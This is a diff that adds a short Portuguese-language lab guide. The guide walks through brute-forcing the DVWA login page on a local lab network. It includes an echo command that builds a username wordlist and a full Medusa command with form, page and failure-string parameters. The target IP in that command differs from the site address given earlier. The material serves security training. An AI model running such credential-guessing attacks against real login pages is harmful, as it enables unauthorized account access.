@@ -1,0 +1,24 @@
+ # Iremos iniciar acessando o site que iremos atacar = http://192.168.56.104/dvwa/login.php
+
+Ao clicar F12 dentro do site, conseguirá visualizar os Post e Get onde foi adicionado o login e senha do site
+
+
+![Python](/workspaces/Lab-Atack-Brute-force/imagens/img20.png)
+
+
+Como criamos as wordlist na etapa anterior, não será necessário criar agora, mas em um ataque real, você poderá incluir varias combinações através do 
+- script " echo -e "user\nmsfadmin\nadmin\nroot" > users.txt"
+
+# Para iniciar o ataque utilize o seguinte comando:
+
+- medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http
+ - -m PAGE: '/dvwa/login.php'
+- -m FORM:'username=^USER^&password=^PASS^&Login=Login'
+- -m 'FAIL=Login failed' -t 6
+
+O primeiro a retornar "sucesso" será o acesso correto e conseguirá acessar o site em questão:
+
+![Python](/workspaces/Lab-Atack-Brute-force/imagens/img21.png)
+
+[def]: imagens/img20.png
+[def2]: /workspaces/Lab-Atack-Brute-force/imagens/img20.png
